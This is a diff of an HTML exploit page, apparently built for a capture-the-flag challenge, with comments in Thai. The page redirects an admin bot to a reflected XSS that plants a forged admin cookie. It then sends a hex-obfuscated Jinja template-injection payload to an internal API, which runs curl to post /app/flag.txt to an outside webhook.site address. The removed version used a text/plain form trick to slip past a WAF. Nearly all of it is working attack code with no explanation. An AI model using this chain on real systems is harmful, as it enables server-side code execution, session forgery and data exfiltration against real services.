@@ -1,24 +1,38 @@
+<!DOCTYPE html>
 <html>
-  <body>
-<script>
-  const payload = `{{ get_flashed_messages|attr("\\x5f\\x5fglobals\\x5f\\x5f")|attr("get")("\\x6fs")|attr("\\x70open")("curl -X POST -d @/app/flag.txt https://webhook.site/c8b5eb75-9989-4b28-8dfa-6b11ee60562f")|attr("read")() }}`;
+<head>
+    <title>Exploit Pivot</title>
+</head>
+<body>
+    <script>
+        // 1. กำหนดค่าเป้าหมาย
+        const WEBHOOK = "https://webhook.site/c8b5eb75-9989-4b28-8dfa-6b11ee60562f";
+        const SCADA_API = "http://127.0.0.1:5000/api/reports/generate";
+        
+        // 2. ปลอมตัวเป็น Admin (Base64 JSON)
+        const ADMIN_TOKEN = "eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJyb2xlIjogImFkbWluIn0=";
 
-  // สร้าง Form เพื่อยิง POST ไปยังภายใน
-  const form = document.createElement('form');
-  form.method = 'POST';
-  form.action = 'http://127.0.0.1:5000/api/reports/generate';
-  
-  // เนื่องจากเราต้องส่ง JSON แต่ HTML Form ปกติส่ง JSON ไม่ได้ 
-  // เราจะใช้เทคนิค text/plain เพื่อหลอก WAF และส่งโครงสร้าง JSON ออกไป
-  form.enctype = 'text/plain'; 
-  
-  const input = document.createElement('input');
-  input.name = `{"template": "${payload}", "dummy": "`;
-  input.value = `"}`;
-  
-  form.appendChild(input);
-  document.body.appendChild(form);
-  form.submit();
-</script>
-  </body>
+        // 3. SSTI Payload (Bypass WAF ด้วย Hex Encoding)
+        // คำสั่ง: cat /app/flag.txt แล้วส่งไปที่ Webhook
+        const SSTI_PAYLOAD = `{{ get_flashed_messages|attr("\\x5f\\x5fglobals\\x5f\\x5f")|attr("get")("\\x6fs")|attr("\\x70open")("curl -X POST -d @/app/flag.txt ${WEBHOOK}")|attr("read")() }}`;
+
+        // 4. สร้าง Script ที่จะไปรันผ่าน XSS บน Port 3000
+        // เพื่อให้มันยิง Port 5000 จาก "ข้างใน" ได้โดยไม่ติด CORS
+        const xssScript = `
+            document.cookie = "session_token=${ADMIN_TOKEN}; path=/; domain=127.0.0.1";
+            fetch("${SCADA_API}", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ "template": \`${SSTI_PAYLOAD}\` })
+            });
+        `;
+
+        // 5. ทำการ Redirect Admin Bot ไปที่หน้า Video ที่มีช่องโหว่ XSS (Reflected)
+        // เราใช้ "> เพื่อปิด Tag เดิมแล้วใส่ <script> ของเราเข้าไป
+        const targetUrl = `http://127.0.0.1:3000/video.html?v=featured%22%3E%3Cscript%3E${encodeURIComponent(xssScript)}%3C/script%3E`;
+
+        console.log("Redirecting Bot to XSS Pivot...");
+        window.location.href = targetUrl;
+    </script>
+</body>
 </html>
